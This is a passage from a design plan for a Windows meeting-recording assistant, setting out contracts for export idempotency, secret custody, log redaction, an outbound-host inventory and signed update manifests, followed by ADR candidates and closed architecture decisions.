**Retry classes.** Network errors, 5xx and 429 → `Retryable` with exponential backoff plus jitter in a
persistent queue that survives restarts. 401/403 → `NeedsReauthentication`, surfaced rather than retried
blindly. 4xx validation → `Permanent`. A destination outage never deletes or degrades local artifacts, and the
queue has a backlog cap of **500 pending exports** with a surfaced state rather than unbounded growth: at
the cap the oldest *queued but never attempted* entry is moved to `failed_permanent{backlog_full}` and
surfaced, so the user is told which export was dropped rather than discovering later that the queue silently
stopped accepting work. Attempts follow the same 5-attempt cap and backoff schedule as
`contract-workflow-step-idempotency`, and the create path is ordered by the same effect ledger: the
`intended` row carrying the `export_key` is committed before the remote call, so the post-crash lookup has a
key to search for.

**Egress audit.** Every outbound send appends `{when, destination_id, host, artifact_id, bytes, outcome}` to a
local audit table — identifiers and counts only, never content (PLAN §7 "all external sends and exports are
auditable locally").

**Operational inputs.** (1) OAuth access/refresh token for Drive (`authority`, producer external — Google —
acquired at consent, required until the export completes, `capability_bound`, mutable between acquire and use;
expiry → refresh, revocation → `NeedsReauthentication`). (2) Notion internal integration token (`authority`,
producer external — the user — acquired at setup, `capability_bound`, non-refreshable, whose only invalidation
signal is a 401 → `NeedsReauthentication`). (3) Recorded remote identity (`versioned_state`, `single_value`,
producer `component-store`, acquired before each attempt, required until the attempt ends, `snapshot`;
unavailable/absent → the external-id lookup path runs before any create).

**Invariants.** For a given `export_key` at most one remote object exists. Local artifacts outlive every
export failure.

**Failure semantics.** All failures are typed and recorded per attempt, so the user sees "why", not "failed".

**Normal witness.** Export to Drive succeeds, records the file id, and a manual re-export updates rather than
duplicating.

**Adversarial witness** (risk tags: `recovery`, `repeated_usage`, `stale`, `boundary`). Given the process is
killed after the Drive create call returned but before the identity was persisted, when the export is retried,
then the external-id lookup must find the existing object and reconcile — a naive implementation creates a
second copy and the user sees duplicate meeting files, the classic idempotency failure this contract exists to
prevent. Second case: a token expiring mid-upload must resume the resumable session after refresh rather than
restarting the upload from zero.

**Verification.** `v-export-crash-before-identity-record` (T1) using a fake destination that simulates the
window. `v-export-duplicate-retry-no-duplicate` (T1). `v-export-auth-failure-classification` (T1).
`v-export-offline-queue-survives-restart` (T2).

<!-- anchor: contract-credential-custody -->
### contract-credential-custody — secrets exist in exactly one place

Owner: `component-security-policy`. Dimension: `security_boundary`. Requirements: NFR-001, FR-020, FR-023.
Evidence mode: `total`. Observable scope: `global`.

**Rule.** Every secret is a `Secret<T>` whose `Debug`, `Display` and `Serialize` render `***` and whose buffer
is zeroized on drop; the inner value is reachable only through an explicit `expose()` used at the call site
that transmits it. Secrets live in Windows Credential Manager under `MeetingAssistant/<purpose>/<account>` and
are read on demand — never copied into configuration files, environment files, the database, the artifact tree,
logs, or process arguments. When a child processor needs a key it arrives via the child's environment block or
stdin, because `argv` on Windows is readable by other processes. A missing credential is a typed
`NeedsAuthentication` that disables the dependent feature with a visible reason; there is no anonymous
fallback and no "continue without export" that silently drops data.

**Operational inputs.** Credential Manager entry (`authority`, producer external — the OS credential store,
written during setup — acquired per use, required until the request completes, `current_lookup` so revocation
takes effect immediately; unavailable → `NeedsAuthentication`, feature disabled, surfaced).

**Invariants.** No secret value is ever serialized by any general-purpose serializer. The set of files the
application writes contains no secret bytes.

**Failure semantics.** Credential store unavailable (rare, but possible under policy) → the affected features
are disabled with a specific error naming the store, never a generic failure.

**Normal witness.** Configuring a Claude API key stores it in Credential Manager; a subsequent request
succeeds; the key appears in no file on disk.

**Adversarial witness** (risk tags: `boundary`, `malformed`, `repeated_usage`). Given a planted known token
value and a full application run that exercises configuration, a failing API call, a panic, and diagnostic
export, when every file the application wrote is scanned, then the token appears in none of them — including
the panic message and the JSON deserialization error, both of which naturally echo their input unless
policy forbids it. Second case: a compile-time assertion that the token type implements neither `Display` nor
`Serialize` in its raw form, so a future `tracing` call cannot regress the property.

**Verification.** `v-credential-no-secret-in-any-written-file` (T2): planted-marker scan.
`v-credential-type-not-displayable` (T0): compile-fail test. `v-credential-argv-free` (T1).
`v-credential-missing-is-typed` (T1).

<!-- anchor: contract-diagnostic-redaction -->
### contract-diagnostic-redaction — logs that cannot leak the meeting

Owner: `component-security-policy`. Dimension: `user_observability`. Requirements: NFR-002, NFR-006, NFR-005.
Evidence mode: `total`. Observable scope: `global`.

**Rule.** Diagnostic logs carry identifiers, enum states, counts, durations and typed error codes. They never
carry audio, transcript text, summary text, meeting titles, participant names, full URLs, or absolute paths
below the artifact root. Log events are structured with a declared field schema; a value of type `Content` is
not loggable at the type level, so leaking meeting text requires deliberately unwrapping it. Error `Display`
implementations must not echo their input payload — a JSON parse error reports position and expected token,
not the document. The user-exportable diagnostic bundle is assembled from these logs plus the signal timeline,
where tab subjects retain `host` only. Panic hooks scrub paths to root-relative form.

**Operational inputs.** None. `input_closure_reason`: redaction is a local, type-enforced property of the
logging surface; no external information is needed to decide whether a value may be logged.

**Invariants.** For any run, the set of bytes in the diagnostic bundle contains no meeting content and no
secret.

**Failure semantics.** If a log sink is unavailable, the application continues; diagnostics are best-effort and
never a reason to interrupt capture.

**Normal witness.** A completed session's log shows transitions, chunk counts and durations, and enough
detail to explain each detection decision by signal id.

**Adversarial witness** (risk tags: `malformed`, `boundary`, `partial_data`). Given a synthetic session whose
transcript contains the marker `ZZ-SECRET-CONTENT-ZZ`, whose meeting title is `ZZ-TITLE-ZZ`, and whose API key
is `ZZ-TOKEN-ZZ`, and given the run includes a malformed processor response that triggers a parse error and a
deliberate panic, when the diagnostic bundle is exported, then no file in the bundle contains any marker. An
implementation that logs the failing payload for debuggability — the most natural thing an engineer does —
fails this test, which is exactly the point.

**Verification.** `v-redaction-marker-scan` (T2). `v-redaction-content-type-not-loggable` (T0): compile-fail
test. `v-redaction-error-display-elides-payload` (T1).

<!-- anchor: contract-egress-inventory -->
### contract-egress-inventory — one file that names every host this product may contact

Owner: `component-security-policy`. Dimension: `security_boundary`. Requirements: NFR-006, NFR-003. Evidence
mode: `total`. Observable scope: `global`.

**Why this contract exists.** "Core boundaries do not require a proprietary backend" is a PLAN Phase 0 exit
criterion, and the only acceptance that can falsify it is the one that enumerates outbound hosts. An
inventory that is described but owned by nothing is not a check — and it is a different artifact from the
`egress_audit` table, which records sends that *happened* at runtime. This one constrains what *can* happen,
at build time, before any user runs anything.

**Rule.** `egress-inventory.toml` at the repository root is the single declaration of every host any component
may contact. Each entry declares `{host, component, purpose, integration_owner, credential_kind}`.
`integration_owner` is a closed enum: `user_account` (the host serves an account the user owns — Google Drive,
Notion, OpenAI, Anthropic), `distribution` (GitHub Releases, for signed manifests and installers), or
`operating_system` (Windows update and certificate revocation endpoints reached by the platform, declared for
completeness and never contacted by product code). There is no `first_party` value; an entry that would need
one cannot be expressed, which is the point.

`cargo test -p ma-secure --test egress_inventory` scans the workspace for outbound-host evidence — string
literals that parse as a host or URL, base-URL constants, and the `egress_hosts` field of every processor and
destination manifest under `contracts/` — and fails when a host appears in the source or a manifest but not in
the inventory, and also when an inventory entry is unreachable from any source (a stale entry is a defect too,
because it makes the file stop describing the product). Test fixtures and the negative fixture workspace are
excluded by a declared path list.

**Relationship to the runtime audit.** `contract-destination-export-idempotency` appends an `egress_audit` row
per send. This contract asserts the containment: every host that appears in an audit row must be in the
inventory. The two together give "what may be contacted" and "what was contacted", and the assertion between
them is what makes an undeclared runtime host detectable rather than merely undocumented.

**Operational inputs.** None. `input_closure_reason`: the check reads two repository files (the inventory and
the source tree) and no external authority, versioned state or credential participates; it is decidable
offline and in a fresh clone.

**Invariants.** No workflow-path component contacts a host absent from the inventory. No inventory entry
declares an owner other than the three enumerated kinds. Every `egress_audit` host is an inventory host.

**Failure semantics.** An undeclared host fails the build with the file, line and host named. An unreachable
inventory entry fails the same check with a distinct code, so "add a host" and "remove a dead entry" are
different fixes rather than one ambiguous failure.

**Normal witness.** The clean workspace: the inventory lists `oauth2.googleapis.com`,
`www.googleapis.com`, `api.notion.com`, `api.openai.com`, `api.anthropic.com` and
`objects.githubusercontent.com`, each mapped to `user_account` or `distribution`, and the check exits 0.

**Adversarial witness** (risk tags: `boundary`, `repeated_usage`). Given a contributor adds a telemetry
`POST` to a new host inside a destination adapter, when the check runs, then it fails naming that host — the
"no proprietary backend" criterion is exactly the criterion a well-intentioned telemetry addition violates,
and review is not a reliable detector of one added constant. Second case: given a host is removed from the
code but left in the inventory, then the check fails with the stale-entry code, so the file cannot decay into
a list of hosts nobody contacts any more.

**Verification.** `v-egress-inventory-complete` (T0): every source and manifest host is declared.
`v-egress-inventory-no-first-party` (T0): every entry maps to `user_account`, `distribution` or
`operating_system`, and no entry is unreachable. `v-egress-inventory-negative-fixture` (T1): a fixture with an
undeclared host fails and names it. `v-egress-audit-matches-inventory` (T1): a fake destination sending to an
undeclared host is rejected before the send and the attempt is recorded.

<!-- anchor: contract-release-manifest-trust -->
### contract-release-manifest-trust — verify before you use anything a manifest says

Owner: `component-release-supply-chain`. Dimension: `security_boundary`. Requirements: FR-025, NFR-003.
Evidence mode: `fallible`. Observable scope: `global`.

**Rule.** Update manifests and adapter manifests are JSON signed with Ed25519; verification uses a key set
embedded in the code-signed binary. **No value from a manifest — URL, path, version, digest, extension id — is
used for anything, including logging, before its signature verifies.** Rollback protection: each manifest
carries a monotonically increasing integer `manifest_version` (distinct from the display semver); a manifest
whose version is ≤ the installed version is rejected unless the user explicitly confirms a downgrade. Key
rotation: a manifest may carry a `key_rollover` block, signed by the *current* key, introducing the next key;
a manifest signed only by an unknown key is rejected. Adapter activation additionally requires that every
artifact digest declared in the manifest matches the file on disk. There is no server-side trust decision
anywhere, which is what keeps `decision-input-no-proprietary-backend` intact.

**Update deferral.** An engine replacement is deferred while any session is non-terminal: the updater waits or
asks, and never swaps the binary under a live recording. This is the updater's obligation, stated here because
the updater is the actor; the observable — "the engine binary is not replaced while a session is non-terminal"
(A-10) — is a property of engine process lifetime, so its check
`v-topology-update-deferred-during-session` (T2) is registered under `contract-process-topology`, whose
`--test topology` binary already drives session lifetime. Homing the rule and its check separately is
deliberate: the rule belongs to whoever can violate it, the check to whoever can observe it.

**Operational inputs.** (1) Embedded public key set (`information`, `single_value`, producer
`component-release-supply-chain` at build time, acquired at process start, required for every verification,
`immutable_value` for the binary's lifetime). (2) Installed manifest version (`versioned_state`, producer
`component-store`, acquired before each check, required until the decision, `current_lookup`; unavailable →
treat as version 0 and require a full verification, never skip the check).

**Invariants.** An unverified manifest has no effect of any kind. Installed version never decreases without
explicit confirmation.

**Failure semantics.** Verification failure, downgrade, digest mismatch, or a non-JSON response (the classic
captive-portal HTML page) all produce a typed rejection with a distinct code and leave the installation
untouched.

**Normal witness.** A valid signed manifest with a higher version verifies, and the updater proceeds.

**Adversarial witness** (risk tags: `stale`, `malformed`, `boundary`, `unsupported_environment`). Given a
previously valid manifest for version 7 replayed while version 9 is installed, when the check runs, then it is
rejected as a downgrade — signature validity alone is not sufficient, and an implementation that checks only
the signature accepts a rollback to a version with a known vulnerability. Second case: a manifest that verifies
but declares an adapter whose on-disk digest does not match must not activate that adapter, and the mismatch
must be reported rather than repaired silently.

**Verification.** `v-manifest-tampered-rejected` (T1). `v-manifest-downgrade-rejected` (T1).
`v-manifest-unknown-key-rejected` (T1). `v-manifest-digest-mismatch-no-activation` (T1). The update-deferral
rule above is verified by `v-topology-update-deferred-during-session` (T2), registered under
`contract-process-topology`.

<!-- anchor: contract-docs-conformance -->
### contract-docs-conformance — Phase 0's decisions land in the system of record

Owner: `component-docs-artifacts`. Dimension: `integration_contract`. Requirements: FR-026. Evidence mode:
`total`. Observable scope: `local`.

**Rule.** ADRs live flat at `docs/adr/adr-<YYYYMMDD>-<slug>.md` (the lint glob is non-recursive), each with a
non-empty `decision_makers` and the tripolar `consequences: {positive, negative, neutral}` form with all three
non-empty, and each starting at status `proposed`. Persistent design documents live at `docs/design/*.md` with
every required field, and each `invariants[].enforcement` names an actual check id from this plan rather than
`review` where a mechanical check exists — a design invariant nobody checks is a wish. The change package's
three required members are materialized: `requirements.md` (EARS + NFR + acceptance), `implementation.md`
(contracts, ordering, targets, seams), `verification.md` (success conditions and runnable checks).

This phase authors exactly **five** persistent design documents, and this is the closed list:
`docs/design/module-boundaries.md`, `session-lifecycle.md`, `recording-artifact-model.md`, `threat-model.md`
and `credential-policy.md`. Trust boundaries are content *inside* `threat-model.md`, not a sixth file.

**Promotion.** A promotion entry upserts or retires a stable item of an *existing* design document, so a
change that creates the repository's first design documents has nothing to promote into: the change root's
promotion manifest is `none` with the reason recorded, and the responsibilities, boundaries, invariants and
capabilities are authored directly into the five documents above. Every later change that alters one of those
items promotes into the owning document normally. The falsifiable form of this rule is that no promotion entry
in this change names a target, and that the five documents exist and validate.

**Operational inputs.** Repository documentation schemas (`versioned_state`, producer external — the dev-docs
toolchain — acquired at authoring time, required until the change closes, `version_bound`; a schema change
mid-phase is handled by re-validating, never by pinning a stale copy).

**Invariants.** Every Phase 0 decision has exactly one owning record: ADRs own *why*, design documents own the
current *discipline*, the change package owns the *generation context*. The same content is not duplicated
across all three.

**Failure semantics.** A conformance error blocks change closure; the phase is not "done" because the files
exist.

**Normal witness.** Every ADR and design document validates against its schema and appears in the docs index.

**Adversarial witness** (risk tags: `boundary`, `stale`). Given an ADR filed at `docs/adr/2026/adr-…md`, when
the docs lint runs, then it must be reported as unindexed — the non-recursive glob means a
conventional-looking year subdirectory silently removes the record from the system. Second case: a design
invariant written with `enforcement: review` where `v-boundary-negative-fixture` exists must be rejected in
review of this contract, because it converts a mechanical guarantee into a social one.

**Verification.** `v-docs-schema-conformance` (T0). `v-docs-adr-placement` (T0). `v-docs-change-members-nonempty`
(T0). `v-docs-invariant-enforcement-named` (T0).

<!-- anchor: contract-verification-tiering -->
### contract-verification-tiering — the checks that need Windows are declared, registered and run

Owner: `component-boundary-check`. Dimension: `integration_contract`. Requirements: NFR-010, NFR-008.
Evidence mode: `total`. Observable scope: `global`.

**Why this contract exists.** Two of the four Phase 0 exit criteria — recording survives the UI's death, and
identifiers survive a restart — are only falsifiable at T2, and every T2 in this plan needs Windows. If CI
gates only the static checks, Phase 0 can be declared complete with a green board while its durability,
authorization and consent suites have never executed anywhere. That is not a hypothetical: it is the default
outcome of writing T2 tests and not saying who runs them.

**Rule — two tiers, both declared in one file.** `verification-tiers.toml` assigns every verification id in
this plan to exactly one tier:

| Tier | Runs on | Contains |
| --- | --- | --- |
| `portable` | any host, including the Linux development and CI hosts | every T0 and T1 verification, and the build and test of the contract-core crates: `ma-core-types`, `ma-session`, `ma-signal`, `ma-detect`, `ma-store`, `ma-workflow`, `ma-processor`, `ma-destination`, `ma-manifest`, `ma-secure` (core module), `xtask` |
| `windows` | a Windows 11 runner | every T2 verification: the topology (including update deferral), durability, consent, authorization and store-contention suites |

**Registration is mandatory and checked.** `cargo xtask verify --check-registration` reads the verification
ids declared by the plan's contracts and fails when any id is absent from the tier file, or is in `portable`
while its test is annotated `#[cfg(windows)]`, or is in `windows` while nothing marks it platform-bound. A new
T2 test that nobody registered is therefore a build failure rather than a test that quietly never runs —
which is the whole mechanism by which this contract prevents a false green.

**Portability is a build property, not an aspiration.** The contract-core crates carry no Windows-only
dependency; platform code lives behind `CaptureSource`, `SignalSource`, the credential store trait and the ACL
helpers, whose Windows implementations are in `ma-signals-windows` and in `cfg(windows)` modules of
`ma-secure` and `ma-capture`. `cargo xtask verify --tier portable` on a non-Windows host builds and tests
exactly the core list, so a dependency that quietly makes the session model Windows-bound fails on the
development host immediately rather than at the next macOS phase.

**Gates.** CI defines two required jobs. The portable job runs on every push and pull request and blocks
merge. The Windows job runs on every pull request into the default branch and on a nightly schedule, and
**Phase 0 is not complete until it reports green**; the change package's verification member names it as the
exit gate rather than leaving "run the T2 suite" as a human intention.

**Operational inputs.** Availability of a Windows 11 runner (`authority`, producer external — the CI provider
or the developer's own machine — acquired when the Windows job starts, required until it reports, `snapshot`;
unavailable → the Windows job is `failed`, never `skipped`, because a skipped required job is
indistinguishable from a passing one on a status board).

**Invariants.** Every verification id in this plan appears in exactly one tier. No T2 verification is
unregistered. The portable tier builds on a non-Windows host.

**Failure semantics.** An unregistered verification fails `--check-registration` with the id named. A Windows
job that cannot acquire a runner fails; it does not pass by absence.

**Normal witness.** On the Linux development host, `cargo xtask verify --tier portable` builds the eleven core
crates and runs every T0 and T1 verification green, and `--check-registration` reports every T2 id assigned to
the `windows` tier.

**Adversarial witness** (risk tags: `unsupported_environment`, `boundary`, `stale`). Given a contributor adds
`v-topology-new-case` as a `#[cfg(windows)]` T2 test and forgets the tier file, when CI runs, then the
portable job fails on registration — an implementation where registration is advisory lets the test exist and
never run, which is exactly the false green this contract exists to make impossible. Second case: given
`ma-session` gains a `windows-rs` dependency through a transitive edge, when the portable tier builds on
Linux, then it fails, naming the crate.

**Verification.** `v-tier-portable-suite-on-non-windows` (T0): `cargo xtask verify --tier portable` on a
non-Windows host. `v-tier-every-t2-registered` (T0): registration completeness and platform-annotation
agreement. `v-tier-ci-defines-both-gates` (T0): the CI workflow is asserted to define both required jobs and
to mark the Windows job as blocking Phase 0 completion. `v-tier-windows-suite-green` (T2):
`cargo xtask verify --tier windows` on a Windows 11 runner.

---

# ADR candidates

Fifteen ADRs, one decision each, all created at status `proposed`. Acceptance is a separate authorised act
under the repository's transition whitelist and this plan does not take it — but that is a lifecycle step, not
an unresolved design question: every decision below is *made* here, and the contracts that depend on it are
written against the made decision rather than against a range. What the change package records is that the
proposed → accepted transition is a gate before the units that implement those contracts start, so the
decisions are reviewed once, deliberately, rather than inherited by accident. Each ADR declares
`decision_makers` and a tripolar `consequences` object with a genuinely non-empty `negative` list.

<!-- anchor: adr-20260903-capture-engine-process-isolation -->
**`adr-20260903-capture-engine-process-isolation`** — the capture engine runs in a process separate from the
UI, is per-user and single-instance, owns session truth, and outlives every client. Named explicitly as a
Phase 0 deliverable in PLAN §6. Inputs: `decision-input-capture-engine-separate-process`,
`decision-input-desktop-stack`. Binds: `contract-process-topology`, `contract-session-state-machine`,
`contract-consent-surface-precondition`.
Negative consequences to state honestly: two long-lived processes to install, update, supervise and debug; a
wire contract that must be versioned; and an engine that must be able to raise its own notification, because
an engine that can only speak through a client cannot start an automatic recording while the client is
closed — which is the case the separate process exists for.

<!-- anchor: adr-20260903-workflow-runtime-process-topology -->
**`adr-20260903-workflow-runtime-process-topology`** — the workflow runtime (queue, scheduler, step
lifecycle, export queue) runs **inside the engine process**; every native or external processor runs in a
per-job `ma-processor-host.exe` child; the store writer set is therefore engine (session, workflow, export,
tombstone) plus UI (settings). This one ADR closes the three questions the drafts carried separately —
where the workflow lives, whether native processors are isolated, and how many DB writers exist — because
they are one decision: they change the same writer table, the same process inventory and the same
satisfaction argument for PLAN §7, and answering any one of them alone leaves the others undecidable.
Alternatives recorded and rejected: workflow in the UI process (processing stops when the user closes the
window, which PLAN §2's "processing continues in the background" forbids); a third dedicated worker process
(a second IPC surface, a second update unit and a third writer, buying nothing the child-process boundary
does not already provide); in-process native processors (an `abort()` in whisper.cpp takes capture with it,
which is precisely what PLAN §7 forbids). Inputs: `decision-input-capture-engine-separate-process`,
`decision-input-desktop-stack`, `decision-input-initial-adapters`. Binds: `contract-process-topology`,
`contract-processing-isolation`, `contract-store-ownership`, `contract-processor-interface`. Negative
consequences to state: the engine process now contains a scheduler as well as real-time audio, so the
capture thread's priority is load-bearing rather than incidental; a per-job child process costs spawn
latency and a small framing protocol on every job; and the two-writer store keeps cross-process WAL
contention that a single-writer design would have removed.

<!-- anchor: adr-20260903-desktop-stack-and-ipc -->
**`adr-20260903-desktop-stack-and-ipc`** — Rust engine (`windows-rs`) + Tauri 2/WebView2 UI, JSON-RPC over a
named pipe, with the alternatives (.NET 8 + WinUI 3; Electron + Rust sidecar; loopback TCP; shared memory)
recorded and rejected with reasons. Inputs: `decision-input-desktop-stack`, `decision-input-ipc-mechanism`.
Binds: `contract-ipc-protocol`, `contract-ipc-transport-authz`.

<!-- anchor: adr-20260903-workspace-boundary-enforcement -->
**`adr-20260903-workspace-boundary-enforcement`** — a cargo workspace with declared layers, adapter crates as
graph sinks, and enforcement by `cargo xtask boundary` (graph + forbidden imports + a two-class literal scan
whose surface is declared: identifier tokens for service words, whole string literals for process, package and
host names, comments never) plus `cargo-deny`, with a mandatory negative fixture that carries decoys as well
as violations so precision is tested alongside detection power. Inputs: `decision-input-boundary-toolchain`,
`decision-input-no-dom-detection`. Binds: `contract-module-boundary-enforcement`,
`contract-detector-determinism`, `contract-processing-isolation`.

<!-- anchor: adr-20260903-local-store-and-artifact-layout -->
**`adr-20260903-local-store-and-artifact-layout`** — SQLite WAL pinned under `%LOCALAPPDATA%`, artifacts under
a relocatable root addressed as `(root_id, relative_path)`, identifier-only path segments, writer ownership per
table family with exactly two writer processes, and two-phase deletion with an idempotent purge and a
content-free tombstone. Records the rejected alternative of routing every write through the engine (it makes
the ownership rule trivially true at the cost of turning a preferences screen into an availability dependency
on the engine). It also fixes the store's own compatibility discipline — `user_version` as the schema-version
carrier, forward-only migrations tested from every released version, and a refusal to open a newer database —
which `contract-store-ownership` states and checks. Inputs: `decision-input-db-artifact-layout`. Binds:
`contract-artifact-addressing`, `contract-store-ownership`, `contract-retention-purge`.

<!-- anchor: adr-20260903-audio-format-and-chunking -->
**`adr-20260903-audio-format-and-chunking`** — 16 kHz mono s16le WAV in 30 s chunks during capture, verified
FLAC consolidation afterwards, optional Opus for sharing; rename-based durability with a ≤30 s loss bound.
Inputs: `decision-input-audio-format`. Binds: `contract-chunk-durability`, `contract-track-consolidation`,
`contract-session-timeline`.

<!-- anchor: adr-20260903-automatic-recording-modes -->
**`adr-20260903-automatic-recording-modes`** — auto/ask/manual with per-application override and a fully
numbered timing model: 10 s cancellable countdown, 60 s cancel-suppression per meeting identity, 60 s end
hysteresis, a 30 s "still in the meeting?" prompt window granting one 300 s extension, all evaluated on a
suspend-excluding clock. Also records the consent-surface rule in its final form — the engine's own OS
notification is the primary indicator and cancel channel, an attached client is the secondary one, and only
the absence of *both* suppresses an automatic start — together with the rejected earlier form (requiring an
attached client), which would have disabled automatic recording in the exact case the separate engine process
exists for. The same reasoning fixes where `ask` mode's Start lives: the engine notification carries it, so
`ask` — the default for the browser application class — does not require an attached client either. Inputs:
`decision-input-recording-modes`. Binds: `contract-recording-mode-policy`,
`contract-consent-surface-precondition`, `contract-session-state-machine`.

<!-- anchor: adr-20260903-detector-signal-replay-contract -->
**`adr-20260903-detector-signal-replay-contract`** — signals are UI-text-free facts, the detector is a pure
replayable function whose purity is lint-enforced, decisions cite evidence, the outcome space is a closed
four-way partition with a "never start without determinate" default, and the replay fixture format is JSONL
with a sidecar label file (rejected: an embedded SQLite fixture, which indexes better for Phase 5 but stops
being reviewable in a diff, and the index can be rebuilt from JSONL at analysis time anyway). Inputs:
`decision-input-no-dom-detection`,
`decision-input-meet-extension-detection-only`. Binds: `contract-signal-envelope`,
`contract-detector-determinism`, `contract-detector-outcome-partition`.

<!-- anchor: adr-20260903-extension-localhost-channel-trust -->
**`adr-20260903-extension-localhost-channel-trust`** — the detection-only extension channel is a loopback
listener authenticated by a user-only-DACL token file plus a pinned extension origin, a 5 s freshness window
and a rate cap, and extension-authority signals can never alone start a recording. Records the rejected
native-messaging alternative honestly: it is materially stronger on security because it deletes the port, the
token file and the whole hostile-web-page surface, and it is not taken because it costs per-browser registry
registration in the installer and a host process per browser, while the residual risk it removes is already
bounded to "a spurious candidate" by the non-authoritativeness rule. Also records the named condition that
reverses the decision, so the choice is re-examined on evidence rather than on memory. Inputs:
`decision-input-meet-extension-detection-only`. Binds: `contract-extension-channel-trust`,
`contract-detector-outcome-partition`.

<!-- anchor: adr-20260903-workflow-identity-and-idempotency -->
**`adr-20260903-workflow-identity-and-idempotency`** — UUIDv7 identifiers everywhere, `step_key`/`export_key`
derivation, lease-based recovery of orphaned running steps, per-chunk work items, and the **intent-before-
effect effect ledger** (commit `intended` before any effect outside the state database, apply, then commit
`applied` with the resource reference; an `intended` with no `applied` after a restart is the named outcome
`unknown`, resolved by lookup or by an explicit user decision, never by a silent recreate). Also fixes two
things the drafts left open. Generated content is immutable `generation` rows with user edits in a separate
`edit_overlay` layer, composed at read time, so regeneration cannot destroy an edit and an unmappable edit is
observable as orphaned rather than gone; speaker-label edits anchor to the speaker cluster rather than to a
segment. And an interrupted recording **finalizes and links** (`continues_from`) rather than resuming into
the same session: resuming would reopen a finalized track and re-run consolidation for the sake of one
library row, and the library can present linked sessions as one meeting without any of that. Inputs:
`decision-input-drive-oauth-pkce`, `decision-input-notion-internal-token`. Binds:
`contract-stable-identity`, `contract-workflow-step-idempotency`,
`contract-destination-export-idempotency`.

<!-- anchor: adr-20260903-initial-processor-adapters -->
**`adr-20260903-initial-processor-adapters`** — whisper.cpp `large-v3-turbo` local, OpenAI STT external,
sherpa-onnx diarization on the loopback track, Claude API summarization plus an OpenAI-compatible adapter; and
the contract they must satisfy (capability declaration, staging, argv-only invocation, provenance,
digest-pinned models, and execution inside a per-job `ma-processor-host.exe` child bounded by a job object).
Inputs: `decision-input-initial-adapters`, `decision-input-transcription-languages`,
`decision-input-cli-adapter-postmvp`. Binds: `contract-processor-interface`. The per-job child process itself
is decided by `adr-20260903-workflow-runtime-process-topology`, which is the ADR that binds
`contract-processing-isolation`; this one adopts that decision rather than re-making it.

<!-- anchor: adr-20260903-local-transcription-budget -->
**`adr-20260903-local-transcription-budget`** — ≤1.0x real time on CPU for a two-hour recording, mandatory
progress and cancellation, overrun as warning; cost convergence required per work item. Inputs:
`decision-input-transcription-budget`. Binds: `contract-processor-budget`.

<!-- anchor: adr-20260903-update-and-manifest-distribution -->
**`adr-20260903-update-and-manifest-distribution`** — GitHub Releases static hosting, code-signed installer,
Ed25519-signed update and adapter manifests with rollback protection and key rotation, verification before any
manifest-declared value is used, updates deferred during an active session. Inputs:
`decision-input-update-manifest-distribution`, `decision-input-no-proprietary-backend`. Binds:
`contract-release-manifest-trust`, `contract-egress-inventory`, `contract-process-topology`.

<!-- anchor: adr-20260903-threat-model-and-credential-policy -->
**`adr-20260903-threat-model-and-credential-policy`** — the trust boundaries (OS user, extension channel,
external providers, update supply chain), asset inventory (audio, transcripts, summaries, tokens), secret
custody in Credential Manager with a non-printable `Secret<T>`, log redaction as a type-level property, the
build-time trust channel that lets a development build authenticate its own engine without weakening the
release rule, the local egress audit, and the build-time egress inventory that constrains which hosts may be
contacted at all. Inputs: `decision-input-no-proprietary-backend`, `decision-input-drive-oauth-pkce`,
`decision-input-notion-internal-token`. Binds: `contract-credential-custody`, `contract-diagnostic-redaction`,
`contract-ipc-transport-authz`, `contract-extension-channel-trust`, `contract-egress-inventory`,
`contract-processor-interface`.

<!-- anchor: adr-20260903-phase0-executable-contract-skeleton -->
**`adr-20260903-phase0-executable-contract-skeleton`** — Phase 0 delivers contracts as executable, checkable
artifacts (type crates + JSON Schemas + synthetic seams + boundary lint + CI) rather than prose alone, because
two of the four Phase 0 exit criteria are not decidable from documents. Records the rejected alternative
(documents-only Phase 0, verification deferred to Phase 1) and its cost: the exit criteria would become
unfalsifiable and would silently move into Phase 1. This ADR is the **single** place the Phase 0 depth
decision lives — the drafts also carried it as an open choice, which meant every acceptance criterion
depended on a question that was simultaneously answered and unanswered. It also fixes the consequence that
follows from shipping T2 tests at all: verification is split into a portable tier and a registered Windows
tier, and an unregistered T2 is a build failure. Inputs: `decision-input-change-package-members`,
`decision-input-design-doc-schema`, `decision-input-adr-schema-shape`,
`decision-input-docs-lint-target-placement`, `decision-input-status-transition-whitelist`. Binds:
`contract-process-topology`, `contract-docs-conformance`,
`contract-verification-tiering`. Negative consequence to state: Phase 0 grows a test suite, a CI pipeline and
a Windows runner requirement, and some seams (`SyntheticSource`, `ScriptedProcessor`) exist only to make
Phase 0 checkable and must be maintained until the real implementations land.

---

# Closed decisions

The drafts preserved eight consequential choices so that closing one would be a recorded decision rather
than an accident of drafting. All eight are closed here. Each row names what was chosen, why, and the ADR
that owns the reasoning; none is deferred, restated as an open question, or left to the implementer.

<!-- section: closed-decision-workflow-runtime-host -->
**Where the workflow runtime lives** (drafted as OQ-1). **Closed: inside the engine process.** The UI is not
a candidate because processing must continue with the window closed. A third worker process buys nothing
that the per-job processor child does not already buy, and costs a second IPC surface, a second update unit
and a third store writer. The reason to keep processing out of the capture process was that a native
inference library can `abort()`; `contract-processing-isolation` removes that reason by putting every native
processor in its own child. Recorded in `adr-20260903-workflow-runtime-process-topology`; fixes
`contract-process-topology`'s process inventory and `contract-store-ownership`'s writer table, which the
drafts could not state while this was open.

<!-- section: closed-decision-processor-isolation -->
**In-process worker pool or per-job child process for native processors** (drafted as OQ-2). **Closed:
per-job child process**, `ma-processor-host.exe`, bounded by a job object, cancelled by kill. It is the same
decision as the one above — hosting the workflow in the engine is only safe because of this — so the two are
recorded in one ADR rather than two. A pure-Rust, allocation-bounded processor may still run in-process, and
the boundary check enforces that such a processor links no native inference library.

<!-- section: closed-decision-db-writer-ownership -->
**Engine-only DB writer, or two writers with role enforcement** (drafted as OQ-3). **Closed: two writers.**
The engine owns `session`, `workflow`, `export` and `tombstone`; the UI owns `settings`; every other UI
mutation goes through a named IPC method (`artifact.edit`, `meeting.delete`). Routing settings through the
engine as well would make a preferences screen depend on engine availability to remove contention that WAL
already handles at human write rates. The accepted cost — cross-process contention bounded by `busy_timeout`
— is verified not to reach capture by `v-store-busy-does-not-stall-capture`. Recorded in
`adr-20260903-local-store-and-artifact-layout` and `adr-20260903-workflow-runtime-process-topology`.

<!-- section: closed-decision-interrupted-session -->
**After an interrupted recording, continue into the same session or start a linked one** (drafted as OQ-4).
**Closed: finalize and link** (`continues_from`). Resuming would reopen a finalized track and re-run
consolidation to save one library row; the library can present linked sessions as a single meeting without
